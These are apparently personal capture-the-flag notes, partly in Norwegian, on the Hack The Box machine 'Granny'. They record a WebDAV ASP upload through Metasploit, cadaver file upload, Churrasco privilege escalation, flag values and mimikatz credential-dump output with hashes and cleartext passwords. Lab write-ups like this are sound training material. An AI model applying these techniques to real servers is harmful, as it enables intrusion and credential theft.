## granny 10.10.10.15

Microsoft Windows 2003\|XP\|2008 \(91%\)

kun port 80

webdav her og?

fikk lastet opp asp fil.

~~netstat -anpt -v -n 10.10.12.238 4444~~

`use exploit/windows/iis/iis_webdav_upload_asp`

Windows .NET Server \(Build 3790, Service Pack 2\).

Architecture    : x86

whoami

nt authority\network service

username **lakis**

**server 2003 sp2 x86**

limited user called “Network Service”. This user has Read and Execute, but no Write access, and a very limited field of view to boot.

Administrator            ASPNET                   Guest

IUSR\_GRANPA              IWAM\_GRANPA              Lakis

SUPPORT\_388945a0

ingen vmic

icalcs ingen write permissions på network service

**cadaver 10.10.10.15**

put som .txt og move til .exe

last opp [https://github.com/Re4son/Churrasco](https://github.com/Re4son/Churrasco)

[http://carnal0wnage.attackresearch.com/2010/05/playing-with-ms09-012-windows-local.html](http://carnal0wnage.attackresearch.com/2010/05/playing-with-ms09-012-windows-local.html)

**msfvenom asp shell funket!**

c.exe -d cmd

C:\inetpub\wwwroot\c.exe -d c:\inetpub\wwwroot\sh.exe

type "c:\documents and settings\administrator\desktop\root.txt"

**aa4beed1c0584445ab463a6747bd06e9**

type "c:\documents and settings\lakis\desktop\user.txt"

**700c5dc163014e22b3e408f8703f67d1**

mimikatz \# sekurlsa::logonpasswords

Authentication Id : 0 ; 653470 \(00000000:0009f89e\)

Session           : NetworkCleartext from 0

User Name         : IUSR\_GRANPA

Domain            : GRANNY

Logon Server      : GRANNY

Logon Time        : 6/1/2017 3:37:04 PM

SID               : S-1-5-21-1709780765-3897210020-3926566182-1003

```
msv :    

 \[00000002\] Primary

 \* Username : IUSR\_GRANPA

 \* Domain   : GRANNY

 \* LM       : a274b4532c9ca5cdf684351fab962e86

 \* NTLM     : 6a981cb5e038b2d8b713743a50d89c88

 \* SHA1     : 29001a81673bf268bc5c435d62209e0c2b27b1f9

wdigest :    

 \* Username : IUSR\_GRANPA

 \* Domain   : GRANNY

 \* Password : 1\_pEx9\[v6;e24}

kerberos :    

 \* Username : IUSR\_GRANPA

 \* Domain   : GRANNY

 \* Password : 1\_pEx9\[v6;e24}

ssp :    

credman :
```

Authentication Id : 0 ; 996 \(00000000:000003e4\)

Session           : Service from 0

User Name         : NETWORK SERVICE

Domain            : NT AUTHORITY

Logon Server      : \(null\)

Logon Time        : 6/1/2017 11:35:55 AM

SID               : S-1-5-20

```
msv :    

 \[00000002\] Primary

 \* Username : GRANNY$

 \* Domain   : HTB

 \* LM       : aad3b435b51404eeaad3b435b51404ee

 \* NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0

 \* SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709

wdigest :
```



